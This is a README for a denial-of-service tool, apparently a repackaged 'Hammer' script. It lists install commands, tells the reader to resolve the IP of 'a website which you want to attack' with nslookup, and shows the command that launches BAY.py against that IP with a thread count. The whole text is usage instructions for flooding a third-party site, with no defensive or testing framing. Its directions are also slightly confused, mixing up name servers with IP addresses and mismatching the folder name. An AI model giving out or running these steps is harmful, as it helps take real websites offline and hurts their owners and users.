# ddos-2022-Bay-Ocu
# $ apt update<br>
# $ apt upgrade<br>
# $ apt install python<br>
# $ apt install git<br>
# $ apt install dnsutils<br>
# $ git clone https://github.com/BayYocu1/ddos-2022-Bay-Ocu.git

Hammer need the <b>Name Server</b> of a website which you want to attack...<br>
To get the Name Server...just type<br>
$ <b>nslookup example.com<b><br>
Note the IP Address of that Website<br>

then <br>
# $ cd Hammer<br>
# $ python BAY.py -s [ip Address] -t 135<br>
example:<br>
# $ python BAY.py -s 123.45.67.89 -t 135<br>
